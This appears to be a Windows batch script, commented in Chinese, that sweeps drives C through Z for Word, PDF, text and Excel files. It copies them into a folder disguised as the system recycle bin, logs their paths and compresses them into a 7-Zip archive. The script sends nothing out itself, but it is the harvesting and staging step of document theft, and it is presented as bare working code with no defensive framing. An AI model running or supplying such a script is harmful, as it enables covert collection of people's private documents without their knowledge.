@echo off
goto :main
这是注释：(for /f "delims="的作用为取消默认的以空格等符号作为分割符
dir /s 实现了linux中的find功能，for /r path %%i in (web.conf?g) do ... 也可以实现find功能，但是自己实现时发现for /r path ...中的path只能是一个具体路径，不能是变量，这样就不能遍历全部磁盘了)
:main
set str=c d e f g h i j k l m n o p q r s t u v w x y z 
rd /s/q c:\recycler\tmp
md c:\recycler\tmp
echo  当前硬盘的分区有： 
for %%i in (%str%) do (
if exist %%i: (echo %%i:

for /f "delims=" %%j in ('dir /b /s "%%i:\*.doc"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> tmp.txt
)

for /f "delims=" %%j in ('dir /b /s "%%i:\*.docx"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.pdf"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.txt"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.xls"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


for /f "delims=" %%j in ('dir /b /s "%%i:\*.xlsx"') do (
echo "yes" | copy "%%j" c:\recycler\tmp
echo %%j >> c:\recycler\tmp\tmp.txt
)


)
)

7z a -t7z C:\recycler\tmp\test.7z C:\recycler\tmp\*.*
